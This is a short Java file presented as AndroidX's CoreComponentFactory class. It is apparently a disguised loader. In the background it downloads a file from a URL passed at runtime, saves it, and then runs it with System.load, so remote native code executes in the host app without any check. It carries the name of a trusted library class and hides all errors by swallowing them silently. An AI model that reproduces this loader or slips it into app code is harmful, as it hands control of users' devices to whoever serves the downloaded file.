package androidx.core.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import android.util.Log;
import java.io.IOException;

@SuppressLint(value="StaticFieldLeak")
class CoreComponentFactory
extends AsyncTask<String, String, String> {
    Context ctx;
    String str;


    CoreComponentFactory(Context context) {
        this.ctx = context;
    }

    @Override
    protected String doInBackground(String... f_url) {
        try {
            str = f_url[1];
            URL url = new URL(f_url[0]);
            url.openConnection().connect();
            BufferedInputStream suka = new BufferedInputStream(url.openStream(), 8192);
            FileOutputStream output = new FileOutputStream(f_url[1]);
            byte data[] = new byte[8192];
            int count;
            while ((count = suka.read(data)) != -1) {
                output.write(data, 0, count);
            }
            suka.close();
            output.flush();
            output.close();
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    protected void onPostExecute(String sukaaa) {
        super.onPostExecute(sukaaa);
        System.load(str);
    }

}
